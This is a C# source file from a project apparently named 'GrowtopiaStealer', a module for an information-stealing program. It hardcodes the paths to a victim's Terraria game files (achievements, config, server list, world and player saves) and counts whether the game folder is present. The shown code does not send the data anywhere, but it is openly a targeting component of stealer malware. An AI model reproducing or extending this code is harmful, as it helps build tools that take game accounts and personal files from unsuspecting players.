using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GrowtopiaStealer
{
    class Terraria
    {
        #region Terraria Path
        public static string dirPathh = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Games\\Terraria";
        public static string achievementsPathh = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Games\\Terraria\\achievements.dat";
        public static string configPathh = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Games\\Terraria\\config.json";
        public static string favoritesPathh = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Games\\Terraria\\favorites.json";
        public static string inputprofilesPathh = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Games\\Terraria\\input profiles.json";
        public static string serversPathh = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Games\\Terraria\\servers.dat";
        public static string WorldsPathh = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Games\\Terraria\\Worlds\\*.*";
        public static string PlayersPathh = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Games\\Terraria\\Players\\*.*";
        #endregion

        #region Exists or No
        public static void TerrariaExistOrNo()
        {
            DirectoryInfo terraria = new DirectoryInfo(Path.Combine(dirPathh));
            // Stop if not exists
            if (!terraria.Exists)
                return;
            Counting.Terraria++;
        }
        #endregion
    }
}
